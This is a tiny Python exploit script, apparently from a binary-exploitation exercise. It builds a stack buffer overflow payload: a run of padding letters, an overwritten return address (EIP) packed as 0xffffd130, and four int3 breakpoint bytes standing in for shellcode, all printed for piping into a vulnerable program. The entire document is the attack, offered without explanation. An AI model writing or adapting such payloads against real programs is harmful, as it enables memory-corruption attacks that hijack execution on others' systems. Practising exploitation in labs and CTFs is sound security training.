import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ"

eip = struct.pack("I",0xffffd130)
next = "\xCC"*4

print(padding + eip + next)
